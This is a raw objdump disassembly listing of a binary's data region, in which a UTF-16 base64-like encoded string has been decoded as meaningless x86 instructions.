  40b8cc:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40b8d0:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8d3:	37                   	aaa
  40b8d4:	00 79 00             	add    %bh,0x0(%ecx)
  40b8d7:	5a                   	pop    %edx
  40b8d8:	00 35 00 53 00 59    	add    %dh,0x59005300
  40b8de:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b8e2:	00 32                	add    %dh,(%edx)
  40b8e4:	00 49 00             	add    %cl,0x0(%ecx)
  40b8e7:	4d                   	dec    %ebp
  40b8e8:	00 48 00             	add    %cl,0x0(%eax)
  40b8eb:	78 00                	js     0x40b8ed
  40b8ed:	42                   	inc    %edx
  40b8ee:	00 65 00             	add    %ah,0x0(%ebp)
  40b8f1:	41                   	inc    %ecx
  40b8f2:	00 30                	add    %dh,(%eax)
  40b8f4:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8f7:	56                   	push   %esi
  40b8f8:	00 62 00             	add    %ah,0x0(%edx)
  40b8fb:	34 00                	xor    $0x0,%al
  40b8fd:	63 00                	arpl   %eax,(%eax)
  40b8ff:	5a                   	pop    %edx
  40b900:	00 5a 00             	add    %bl,0x0(%edx)
  40b903:	2f                   	das
  40b904:	00 2f                	add    %ch,(%edi)
  40b906:	00 5a 00             	add    %bl,0x0(%edx)
  40b909:	6f                   	outsl  %ds:(%esi),(%dx)
  40b90a:	00 32                	add    %dh,(%edx)
  40b90c:	00 2b                	add    %ch,(%ebx)
  40b90e:	00 51 00             	add    %dl,0x0(%ecx)
  40b911:	70 00                	jo     0x40b913
  40b913:	6c                   	insb   (%dx),%es:(%edi)
  40b914:	00 71 00             	add    %dh,0x0(%ecx)
  40b917:	44                   	inc    %esp
  40b918:	00 78 00             	add    %bh,0x0(%eax)
  40b91b:	32 00                	xor    (%eax),%al
  40b91d:	4a                   	dec    %edx
  40b91e:	00 4f 00             	add    %cl,0x0(%edi)
  40b921:	46                   	inc    %esi
  40b922:	00 32                	add    %dh,(%edx)
  40b924:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40b928:	00 4d 00             	add    %cl,0x0(%ebp)
  40b92b:	51                   	push   %ecx
  40b92c:	00 38                	add    %bh,(%eax)
  40b92e:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40b932:	00 49 00             	add    %cl,0x0(%ecx)
  40b935:	30 00                	xor    %al,(%eax)
  40b937:	54                   	push   %esp
  40b938:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40b93c:	00 63 00             	add    %ah,0x0(%ebx)
  40b93f:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40b943:	43                   	inc    %ebx
  40b944:	00 69 00             	add    %ch,0x0(%ecx)
  40b947:	38 00                	cmp    %al,(%eax)
  40b949:	37                   	aaa
  40b94a:	00 77 00             	add    %dh,0x0(%edi)
  40b94d:	74 00                	je     0x40b94f
  40b94f:	42                   	inc    %edx
  40b950:	00 6f 00             	add    %ch,0x0(%edi)
  40b953:	4e                   	dec    %esi
  40b954:	00 30                	add    %dh,(%eax)
  40b956:	00 49 00             	add    %cl,0x0(%ecx)
  40b959:	4b                   	dec    %ebx
  40b95a:	00 42 00             	add    %al,0x0(%edx)
  40b95d:	45                   	inc    %ebp
  40b95e:	00 47 00             	add    %al,0x0(%edi)
  40b961:	46                   	inc    %esi
  40b962:	00 47 00             	add    %al,0x0(%edi)
  40b965:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b969:	6a 00                	push   $0x0
  40b96b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b96c:	00 35 00 2f 00 53    	add    %dh,0x53002f00
  40b972:	00 43 00             	add    %al,0x0(%ebx)
  40b975:	74 00                	je     0x40b977
  40b977:	78 00                	js     0x40b979
  40b979:	31 00                	xor    %eax,(%eax)
  40b97b:	45                   	inc    %ebp
  40b97c:	00 58 00             	add    %bl,0x0(%eax)
  40b97f:	79 00                	jns    0x40b981
  40b981:	44                   	inc    %esp
  40b982:	00 75 00             	add    %dh,0x0(%ebp)
  40b985:	31 00                	xor    %eax,(%eax)
  40b987:	53                   	push   %ebx
  40b988:	00 2b                	add    %ch,(%ebx)
  40b98a:	00 70 00             	add    %dh,0x0(%eax)
  40b98d:	7a 00                	jp     0x40b98f
  40b98f:	61                   	popa
  40b990:	00 55 00             	add    %dl,0x0(%ebp)
  40b993:	6f                   	outsl  %ds:(%esi),(%dx)
  40b994:	00 78 00             	add    %bh,0x0(%eax)
  40b997:	75 00                	jne    0x40b999
  40b999:	42                   	inc    %edx
  40b99a:	00 57 00             	add    %dl,0x0(%edi)
  40b99d:	53                   	push   %ebx
  40b99e:	00 58 00             	add    %bl,0x0(%eax)
  40b9a1:	70 00                	jo     0x40b9a3
  40b9a3:	5a                   	pop    %edx
  40b9a4:	00 72 00             	add    %dh,0x0(%edx)
  40b9a7:	32 00                	xor    (%eax),%al
  40b9a9:	6a 00                	push   $0x0
  40b9ab:	42                   	inc    %edx
  40b9ac:	00 37                	add    %dh,(%edi)
  40b9ae:	00 6a 00             	add    %ch,0x0(%edx)
  40b9b1:	35 00 34 00 66       	xor    $0x66003400,%eax
  40b9b6:	00 51 00             	add    %dl,0x0(%ecx)
  40b9b9:	55                   	push   %ebp
  40b9ba:	00 51 00             	add    %dl,0x0(%ecx)
  40b9bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9be:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b9c2:	00 70 00             	add    %dh,0x0(%eax)
  40b9c5:	48                   	dec    %eax
  40b9c6:	00 73 00             	add    %dh,0x0(%ebx)
  40b9c9:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b9cd:	71 00                	jno    0x40b9cf
  40b9cf:	36 00 6c 00 6c       	add    %ch,%ss:0x6c(%eax,%eax,1)
  40b9d4:	00 70 00             	add    %dh,0x0(%eax)
  40b9d7:	52                   	push   %edx
  40b9d8:	00 37                	add    %dh,(%edi)
  40b9da:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40b9de:	00 2b                	add    %ch,(%ebx)
  40b9e0:	00 47 00             	add    %al,0x0(%edi)
  40b9e3:	34 00                	xor    $0x0,%al
  40b9e5:	74 00                	je     0x40b9e7
  40b9e7:	48                   	dec    %eax
  40b9e8:	00 6a 00             	add    %ch,0x0(%edx)
  40b9eb:	45                   	inc    %ebp
  40b9ec:	00 62 00             	add    %ah,0x0(%edx)
  40b9ef:	4d                   	dec    %ebp
  40b9f0:	00 2f                	add    %ch,(%edi)
  40b9f2:	00 2f                	add    %ch,(%edi)
  40b9f4:	00 6a 00             	add    %ch,0x0(%edx)
  40b9f7:	39 00                	cmp    %eax,(%eax)
  40b9f9:	44                   	inc    %esp
  40b9fa:	00 72 00             	add    %dh,0x0(%edx)
  40b9fd:	78 00                	js     0x40b9ff
  40b9ff:	71 00                	jno    0x40ba01
  40ba01:	76 00                	jbe    0x40ba03
  40ba03:	71 00                	jno    0x40ba05
  40ba05:	32 00                	xor    (%eax),%al
  40ba07:	53                   	push   %ebx
  40ba08:	00 68 00             	add    %ch,0x0(%eax)
  40ba0b:	33 00                	xor    (%eax),%eax
  40ba0d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba0e:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40ba12:	00 6e 00             	add    %ch,0x0(%esi)
  40ba15:	51                   	push   %ecx
  40ba16:	00 48 00             	add    %cl,0x0(%eax)
  40ba19:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba1a:	00 67 00             	add    %ah,0x0(%edi)
  40ba1d:	75 00                	jne    0x40ba1f
  40ba1f:	4e                   	dec    %esi
  40ba20:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba23:	47                   	inc    %edi
  40ba24:	00 48 00             	add    %cl,0x0(%eax)
  40ba27:	44                   	inc    %esp
  40ba28:	00 4a 00             	add    %cl,0x0(%edx)
  40ba2b:	63 00                	arpl   %eax,(%eax)
  40ba2d:	54                   	push   %esp
  40ba2e:	00 31                	add    %dh,(%ecx)
  40ba30:	00 76 00             	add    %dh,0x0(%esi)
  40ba33:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40ba37:	77 00                	ja     0x40ba39
  40ba39:	4e                   	dec    %esi
  40ba3a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba3d:	37                   	aaa
  40ba3e:	00 45 00             	add    %al,0x0(%ebp)
  40ba41:	4f                   	dec    %edi
  40ba42:	00 39                	add    %bh,(%ecx)
  40ba44:	00 43 00             	add    %al,0x0(%ebx)
  40ba47:	48                   	dec    %eax
  40ba48:	00 41 00             	add    %al,0x0(%ecx)
  40ba4b:	34 00                	xor    $0x0,%al
  40ba4d:	2b 00                	sub    (%eax),%eax
  40ba4f:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40ba53:	49                   	dec    %ecx
  40ba54:	00 6f 00             	add    %ch,0x0(%edi)
  40ba57:	77 00                	ja     0x40ba59
  40ba59:	78 00                	js     0x40ba5b
  40ba5b:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40ba5f:	39 00                	cmp    %eax,(%eax)
  40ba61:	31 00                	xor    %eax,(%eax)
  40ba63:	35 00 48 00 59       	xor    $0x59004800,%eax
  40ba68:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40ba6c:	00 56 00             	add    %dl,0x0(%esi)
  40ba6f:	78 00                	js     0x40ba71
  40ba71:	43                   	inc    %ebx
  40ba72:	00 57 00             	add    %dl,0x0(%edi)
  40ba75:	49                   	dec    %ecx
  40ba76:	00 56 00             	add    %dl,0x0(%esi)
  40ba79:	37                   	aaa
  40ba7a:	00 73 00             	add    %dh,0x0(%ebx)
  40ba7d:	7a 00                	jp     0x40ba7f
  40ba7f:	75 00                	jne    0x40ba81
  40ba81:	75 00                	jne    0x40ba83
  40ba83:	75 00                	jne    0x40ba85
  40ba85:	58                   	pop    %eax
  40ba86:	00 66 00             	add    %ah,0x0(%esi)
  40ba89:	67 00 56 00          	add    %dl,0x0(%bp)
  40ba8d:	59                   	pop    %ecx
  40ba8e:	00 56 00             	add    %dl,0x0(%esi)
  40ba91:	39 00                	cmp    %eax,(%eax)
  40ba93:	76 00                	jbe    0x40ba95
  40ba95:	4d                   	dec    %ebp
  40ba96:	00 73 00             	add    %dh,0x0(%ebx)
  40ba99:	31 00                	xor    %eax,(%eax)
  40ba9b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba9c:	00 55 00             	add    %dl,0x0(%ebp)
  40ba9f:	34 00                	xor    $0x0,%al
  40baa1:	76 00                	jbe    0x40baa3
  40baa3:	50                   	push   %eax
  40baa4:	00 42 00             	add    %al,0x0(%edx)
  40baa7:	30 00                	xor    %al,(%eax)
  40baa9:	57                   	push   %edi
  40baaa:	00 52 00             	add    %dl,0x0(%edx)
  40baad:	33 00                	xor    (%eax),%eax
  40baaf:	79 00                	jns    0x40bab1
  40bab1:	70 00                	jo     0x40bab3
  40bab3:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40bab7:	49                   	dec    %ecx
  40bab8:	00 67 00             	add    %ah,0x0(%edi)
  40babb:	35 00 7a 00 5a       	xor    $0x5a007a00,%eax
  40bac0:	00 52 00             	add    %dl,0x0(%edx)
  40bac3:	31 00                	xor    %eax,(%eax)
  40bac5:	75 00                	jne    0x40bac7
  40bac7:	52                   	push   %edx
  40bac8:	00 4b 00             	add    %cl,0x0(%ebx)
  40bacb:	4a                   	dec    %edx
  40bacc:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40bad0:	00 49 00             	add    %cl,0x0(%ecx)
  40bad3:	69 00 70 00 54 00    	imul   $0x540070,(%eax),%eax
  40bad9:	63 00                	arpl   %eax,(%eax)
  40badb:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40badf:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40bae3:	78 00                	js     0x40bae5
  40bae5:	6a 00                	push   $0x0
  40bae7:	42                   	inc    %edx
  40bae8:	00 49 00             	add    %cl,0x0(%ecx)
  40baeb:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40baef:	62 00                	bound  %eax,(%eax)
  40baf1:	4a                   	dec    %edx
  40baf2:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40baf6:	00 71 00             	add    %dh,0x0(%ecx)
  40baf9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bafa:	00 30                	add    %dh,(%eax)
  40bafc:	00 33                	add    %dh,(%ebx)
  40bafe:	00 58 00             	add    %bl,0x0(%eax)
  40bb01:	54                   	push   %esp
  40bb02:	00 6b 00             	add    %ch,0x0(%ebx)
  40bb05:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb06:	00 4b 00             	add    %cl,0x0(%ebx)
  40bb09:	50                   	push   %eax
  40bb0a:	00 63 00             	add    %ah,0x0(%ebx)
  40bb0d:	79 00                	jns    0x40bb0f
  40bb0f:	4c                   	dec    %esp
  40bb10:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40bb14:	00 73 00             	add    %dh,0x0(%ebx)
  40bb17:	37                   	aaa
  40bb18:	00 6e 00             	add    %ch,0x0(%esi)
  40bb1b:	56                   	push   %esi
  40bb1c:	00 75 00             	add    %dh,0x0(%ebp)
  40bb1f:	35 00 47 00 50       	xor    $0x50004700,%eax
  40bb24:	00 77 00             	add    %dh,0x0(%edi)
  40bb27:	55                   	push   %ebp
  40bb28:	00 52 00             	add    %dl,0x0(%edx)
  40bb2b:	53                   	push   %ebx
  40bb2c:	00 78 00             	add    %bh,0x0(%eax)
  40bb2f:	52                   	push   %edx
  40bb30:	00 33                	add    %dh,(%ebx)
  40bb32:	00 72 00             	add    %dh,0x0(%edx)
  40bb35:	43                   	inc    %ebx
  40bb36:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40bb3a:	00 35 00 72 00 33    	add    %dh,0x33007200
  40bb40:	00 62 00             	add    %ah,0x0(%edx)
  40bb43:	70 00                	jo     0x40bb45
  40bb45:	48                   	dec    %eax
  40bb46:	00 63 00             	add    %ah,0x0(%ebx)
  40bb49:	56                   	push   %esi
  40bb4a:	00 77 00             	add    %dh,0x0(%edi)
  40bb4d:	33 00                	xor    (%eax),%eax
  40bb4f:	31 00                	xor    %eax,(%eax)
  40bb51:	43                   	inc    %ebx
  40bb52:	00 33                	add    %dh,(%ebx)
  40bb54:	00 2f                	add    %ch,(%edi)
  40bb56:	00 53 00             	add    %dl,0x0(%ebx)
  40bb59:	53                   	push   %ebx
  40bb5a:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb5d:	79 00                	jns    0x40bb5f
  40bb5f:	72 00                	jb     0x40bb61
  40bb61:	68 00 54 00 34       	push   $0x34005400
  40bb66:	00 66 00             	add    %ah,0x0(%esi)
  40bb69:	6c                   	insb   (%dx),%es:(%edi)
  40bb6a:	00 37                	add    %dh,(%edi)
  40bb6c:	00 6e 00             	add    %ch,0x0(%esi)
  40bb6f:	6a 00                	push   $0x0
  40bb71:	36 00 44 00 59       	add    %al,%ss:0x59(%eax,%eax,1)
  40bb76:	00 41 00             	add    %al,0x0(%ecx)
  40bb79:	51                   	push   %ecx
  40bb7a:	00 30                	add    %dh,(%eax)
  40bb7c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb7f:	38 00                	cmp    %al,(%eax)
  40bb81:	52                   	push   %edx
  40bb82:	00 71 00             	add    %dh,0x0(%ecx)
  40bb85:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb89:	32 00                	xor    (%eax),%al
  40bb8b:	50                   	push   %eax
  40bb8c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb8f:	4b                   	dec    %ebx
  40bb90:	00 6f 00             	add    %ch,0x0(%edi)
  40bb93:	66 00 37             	data16 add %dh,(%edi)
  40bb96:	00 69 00             	add    %ch,0x0(%ecx)
  40bb99:	49                   	dec    %ecx
  40bb9a:	00 30                	add    %dh,(%eax)
  40bb9c:	00 73 00             	add    %dh,0x0(%ebx)
  40bb9f:	78 00                	js     0x40bba1
  40bba1:	53                   	push   %ebx
  40bba2:	00 4d 00             	add    %cl,0x0(%ebp)
  40bba5:	59                   	pop    %ecx
  40bba6:	00 56 00             	add    %dl,0x0(%esi)
  40bba9:	4e                   	dec    %esi
  40bbaa:	00 31                	add    %dh,(%ecx)
  40bbac:	00 48 00             	add    %cl,0x0(%eax)
  40bbaf:	6d                   	insl   (%dx),%es:(%edi)
  40bbb0:	00 51 00             	add    %dl,0x0(%ecx)
  40bbb3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbb4:	00 67 00             	add    %ah,0x0(%edi)
  40bbb7:	4d                   	dec    %ebp
  40bbb8:	00 70 00             	add    %dh,0x0(%eax)
  40bbbb:	44                   	inc    %esp
  40bbbc:	00 37                	add    %dh,(%edi)
  40bbbe:	00 62 00             	add    %ah,0x0(%edx)
  40bbc1:	61                   	popa
  40bbc2:	00 77 00             	add    %dh,0x0(%edi)
  40bbc5:	32 00                	xor    (%eax),%al
  40bbc7:	39 00                	cmp    %eax,(%eax)
  40bbc9:	68 00 58 00 6d       	push   $0x6d005800
  40bbce:	00 68 00             	add    %ch,0x0(%eax)
  40bbd1:	32 00                	xor    (%eax),%al
  40bbd3:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40bbd7:	68 00 62 00 71       	push   $0x71006200
  40bbdc:	00 43 00             	add    %al,0x0(%ebx)
  40bbdf:	2f                   	das
  40bbe0:	00 42 00             	add    %al,0x0(%edx)
  40bbe3:	47                   	inc    %edi
  40bbe4:	00 4d 00             	add    %cl,0x0(%ebp)
  40bbe7:	48                   	dec    %eax
  40bbe8:	00 37                	add    %dh,(%edi)
  40bbea:	00 68 00             	add    %ch,0x0(%eax)
  40bbed:	56                   	push   %esi
  40bbee:	00 58 00             	add    %bl,0x0(%eax)
  40bbf1:	34 00                	xor    $0x0,%al
  40bbf3:	30 00                	xor    %al,(%eax)
  40bbf5:	35 00 59 00 6e       	xor    $0x6e005900,%eax
  40bbfa:	00 76 00             	add    %dh,0x0(%esi)
  40bbfd:	7a 00                	jp     0x40bbff
  40bbff:	74 00                	je     0x40bc01
  40bc01:	62 00                	bound  %eax,(%eax)
  40bc03:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40bc06:	00 61 00             	add    %ah,0x0(%ecx)
  40bc09:	77 00                	ja     0x40bc0b
  40bc0b:	46                   	inc    %esi
  40bc0c:	00 30                	add    %dh,(%eax)
  40bc0e:	00 6f 00             	add    %ch,0x0(%edi)
  40bc11:	70 00                	jo     0x40bc13
  40bc13:	66 00 42 00          	data16 add %al,0x0(%edx)
  40bc17:	48                   	dec    %eax
  40bc18:	00 37                	add    %dh,(%edi)
  40bc1a:	00 4e 00             	add    %cl,0x0(%esi)
  40bc1d:	50                   	push   %eax
  40bc1e:	00 63 00             	add    %ah,0x0(%ebx)
  40bc21:	6d                   	insl   (%dx),%es:(%edi)
  40bc22:	00 75 00             	add    %dh,0x0(%ebp)
  40bc25:	61                   	popa
  40bc26:	00 67 00             	add    %ah,0x0(%edi)
  40bc29:	71 00                	jno    0x40bc2b
  40bc2b:	58                   	pop    %eax
  40bc2c:	00 58 00             	add    %bl,0x0(%eax)
  40bc2f:	46                   	inc    %esi
  40bc30:	00 47 00             	add    %al,0x0(%edi)
  40bc33:	34 00                	xor    $0x0,%al
  40bc35:	59                   	pop    %ecx
  40bc36:	00 51 00             	add    %dl,0x0(%ecx)
  40bc39:	5a                   	pop    %edx
  40bc3a:	00 35 00 55 00 34    	add    %dh,0x34005500
  40bc40:	00 47 00             	add    %al,0x0(%edi)
  40bc43:	72 00                	jb     0x40bc45
  40bc45:	30 00                	xor    %al,(%eax)
  40bc47:	51                   	push   %ecx
  40bc48:	00 6e 00             	add    %ch,0x0(%esi)
  40bc4b:	59                   	pop    %ecx
  40bc4c:	00 31                	add    %dh,(%ecx)
  40bc4e:	00 30                	add    %dh,(%eax)
  40bc50:	00 50 00             	add    %dl,0x0(%eax)
  40bc53:	43                   	inc    %ebx
  40bc54:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc57:	68 00 65 00 4d       	push   $0x4d006500
  40bc5c:	00 70 00             	add    %dh,0x0(%eax)
  40bc5f:	7a 00                	jp     0x40bc61
  40bc61:	72 00                	jb     0x40bc63
  40bc63:	48                   	dec    %eax
  40bc64:	00 6a 00             	add    %ch,0x0(%edx)
  40bc67:	4a                   	dec    %edx
  40bc68:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40bc6c:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40bc70:	00 71 00             	add    %dh,0x0(%ecx)
  40bc73:	43                   	inc    %ebx
  40bc74:	00 30                	add    %dh,(%eax)
  40bc76:	00 57 00             	add    %dl,0x0(%edi)
  40bc79:	39 00                	cmp    %eax,(%eax)
  40bc7b:	4e                   	dec    %esi
  40bc7c:	00 70 00             	add    %dh,0x0(%eax)
  40bc7f:	70 00                	jo     0x40bc81
  40bc81:	5a                   	pop    %edx
  40bc82:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc85:	34 00                	xor    $0x0,%al
  40bc87:	59                   	pop    %ecx
  40bc88:	00 2b                	add    %ch,(%ebx)
  40bc8a:	00 49 00             	add    %cl,0x0(%ecx)
  40bc8d:	2b 00                	sub    (%eax),%eax
  40bc8f:	32 00                	xor    (%eax),%al
  40bc91:	78 00                	js     0x40bc93
  40bc93:	69 00 54 00 65 00    	imul   $0x650054,(%eax),%eax
  40bc99:	39 00                	cmp    %eax,(%eax)
  40bc9b:	42                   	inc    %edx
  40bc9c:	00 69 00             	add    %ch,0x0(%ecx)
  40bc9f:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40bca3:	66 00 74 00 47       	data16 add %dh,0x47(%eax,%eax,1)
  40bca8:	00 70 00             	add    %dh,0x0(%eax)
  40bcab:	50                   	push   %eax
  40bcac:	00 48 00             	add    %cl,0x0(%eax)
  40bcaf:	59                   	pop    %ecx
  40bcb0:	00 4d 00             	add    %cl,0x0(%ebp)
  40bcb3:	53                   	push   %ebx
  40bcb4:	00 68 00             	add    %ch,0x0(%eax)
  40bcb7:	6c                   	insb   (%dx),%es:(%edi)
  40bcb8:	00 67 00             	add    %ah,0x0(%edi)
  40bcbb:	34 00                	xor    $0x0,%al
  40bcbd:	74 00                	je     0x40bcbf
  40bcbf:	31 00                	xor    %eax,(%eax)
  40bcc1:	74 00                	je     0x40bcc3
  40bcc3:	69 00 63 00 48 00    	imul   $0x480063,(%eax),%eax
  40bcc9:	53                   	push   %ebx
  40bcca:	00 2b                	add    %ch,(%ebx)
  40bccc:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40bcd0:	00 72 00             	add    %dh,0x0(%edx)
  40bcd3:	44                   	inc    %esp
  40bcd4:	00 36                	add    %dh,(%esi)
  40bcd6:	00 79 00             	add    %bh,0x0(%ecx)
  40bcd9:	78 00                	js     0x40bcdb
  40bcdb:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40bcdf:	72 00                	jb     0x40bce1
  40bce1:	37                   	aaa
  40bce2:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40bce6:	00 52 00             	add    %dl,0x0(%edx)
  40bce9:	46                   	inc    %esi
  40bcea:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40bcee:	00 31                	add    %dh,(%ecx)
  40bcf0:	00 61 00             	add    %ah,0x0(%ecx)
  40bcf3:	68 00 4d 00 4e       	push   $0x4e004d00
  40bcf8:	00 7a 00             	add    %bh,0x0(%edx)
  40bcfb:	37                   	aaa
  40bcfc:	00 39                	add    %bh,(%ecx)
  40bcfe:	00 2b                	add    %ch,(%ebx)
  40bd00:	00 69 00             	add    %ch,0x0(%ecx)
  40bd03:	70 00                	jo     0x40bd05
  40bd05:	48                   	dec    %eax
  40bd06:	00 72 00             	add    %dh,0x0(%edx)
  40bd09:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40bd0d:	4b                   	dec    %ebx
  40bd0e:	00 65 00             	add    %ah,0x0(%ebp)
  40bd11:	32 00                	xor    (%eax),%al
  40bd13:	6a 00                	push   $0x0
  40bd15:	59                   	pop    %ecx
  40bd16:	00 35 00 38 00 71    	add    %dh,0x71003800
  40bd1c:	00 76 00             	add    %dh,0x0(%esi)
  40bd1f:	68 00 78 00 6d       	push   $0x6d007800
  40bd24:	00 65 00             	add    %ah,0x0(%ebp)
  40bd27:	47                   	inc    %edi
  40bd28:	00 70 00             	add    %dh,0x0(%eax)
  40bd2b:	44                   	inc    %esp
  40bd2c:	00 30                	add    %dh,(%eax)
  40bd2e:	00 4e 00             	add    %cl,0x0(%esi)
  40bd31:	4d                   	dec    %ebp
  40bd32:	00 59 00             	add    %bl,0x0(%ecx)
  40bd35:	4c                   	dec    %esp
  40bd36:	00 78 00             	add    %bh,0x0(%eax)
  40bd39:	48                   	dec    %eax
  40bd3a:	00 6a 00             	add    %ch,0x0(%edx)
  40bd3d:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40bd41:	47                   	inc    %edi
  40bd42:	00 33                	add    %dh,(%ebx)
  40bd44:	00 62 00             	add    %ah,0x0(%edx)
  40bd47:	74 00                	je     0x40bd49
  40bd49:	55                   	push   %ebp
  40bd4a:	00 6f 00             	add    %ch,0x0(%edi)
  40bd4d:	36 00 74 00 51       	add    %dh,%ss:0x51(%eax,%eax,1)
  40bd52:	00 5a 00             	add    %bl,0x0(%edx)
  40bd55:	35 00 76 00 2b       	xor    $0x2b007600,%eax
  40bd5a:	00 51 00             	add    %dl,0x0(%ecx)
  40bd5d:	34 00                	xor    $0x0,%al
  40bd5f:	66 00 54 00 76       	data16 add %dl,0x76(%eax,%eax,1)
  40bd64:	00 46 00             	add    %al,0x0(%esi)
  40bd67:	51                   	push   %ecx
  40bd68:	00 4f 00             	add    %cl,0x0(%edi)
  40bd6b:	64 00 36             	add    %dh,%fs:(%esi)
  40bd6e:	00 31                	add    %dh,(%ecx)
  40bd70:	00 2b                	add    %ch,(%ebx)
  40bd72:	00 6e 00             	add    %ch,0x0(%esi)
  40bd75:	74 00                	je     0x40bd77
  40bd77:	59                   	pop    %ecx
  40bd78:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd7b:	4a                   	dec    %edx
  40bd7c:	00 71 00             	add    %dh,0x0(%ecx)
  40bd7f:	51                   	push   %ecx
  40bd80:	00 4a 00             	add    %cl,0x0(%edx)
  40bd83:	39 00                	cmp    %eax,(%eax)
  40bd85:	30 00                	xor    %al,(%eax)
  40bd87:	6d                   	insl   (%dx),%es:(%edi)
  40bd88:	00 78 00             	add    %bh,0x0(%eax)
  40bd8b:	55                   	push   %ebp
  40bd8c:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  40bd90:	00 6b 00             	add    %ch,0x0(%ebx)
  40bd93:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd94:	00 70 00             	add    %dh,0x0(%eax)
  40bd97:	38 00                	cmp    %al,(%eax)
  40bd99:	31 00                	xor    %eax,(%eax)
  40bd9b:	46                   	inc    %esi
  40bd9c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd9f:	63 00                	arpl   %eax,(%eax)
  40bda1:	4a                   	dec    %edx
  40bda2:	00 4d 00             	add    %cl,0x0(%ebp)
  40bda5:	74 00                	je     0x40bda7
  40bda7:	42                   	inc    %edx
  40bda8:	00 61 00             	add    %ah,0x0(%ecx)
  40bdab:	79 00                	jns    0x40bdad
  40bdad:	57                   	push   %edi
  40bdae:	00 4f 00             	add    %cl,0x0(%edi)
  40bdb1:	74 00                	je     0x40bdb3
  40bdb3:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40bdb7:	4c                   	dec    %esp
  40bdb8:	00 50 00             	add    %dl,0x0(%eax)
  40bdbb:	48                   	dec    %eax
  40bdbc:	00 35 00 64 00 75    	add    %dh,0x75006400
  40bdc2:	00 33                	add    %dh,(%ebx)
  40bdc4:	00 6b 00             	add    %ch,0x0(%ebx)
  40bdc7:	53                   	push   %ebx
  40bdc8:	00 67 00             	add    %ah,0x0(%edi)
  40bdcb:	74 00                	je     0x40bdcd
  40bdcd:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bdd1:	75 00                	jne    0x40bdd3
  40bdd3:	46                   	inc    %esi
  40bdd4:	00 6d 00             	add    %ch,0x0(%ebp)
  40bdd7:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40bddb:	49                   	dec    %ecx
  40bddc:	00 30                	add    %dh,(%eax)
  40bdde:	00 7a 00             	add    %bh,0x0(%edx)
  40bde1:	53                   	push   %ebx
  40bde2:	00 2b                	add    %ch,(%ebx)
  40bde4:	00 39                	add    %bh,(%ecx)
  40bde6:	00 35 00 67 00 58    	add    %dh,0x58006700
  40bdec:	00 57 00             	add    %dl,0x0(%edi)
  40bdef:	6e                   	outsb  %ds:(%esi),(%dx)
  40bdf0:	00 2f                	add    %ch,(%edi)
  40bdf2:	00 69 00             	add    %ch,0x0(%ecx)
  40bdf5:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40bdf9:	79 00                	jns    0x40bdfb
  40bdfb:	44                   	inc    %esp
  40bdfc:	00 50 00             	add    %dl,0x0(%eax)
  40bdff:	45                   	inc    %ebp
  40be00:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40be04:	00 72 00             	add    %dh,0x0(%edx)
  40be07:	50                   	push   %eax
  40be08:	00 45 00             	add    %al,0x0(%ebp)
  40be0b:	30 00                	xor    %al,(%eax)
  40be0d:	30 00                	xor    %al,(%eax)
  40be0f:	50                   	push   %eax
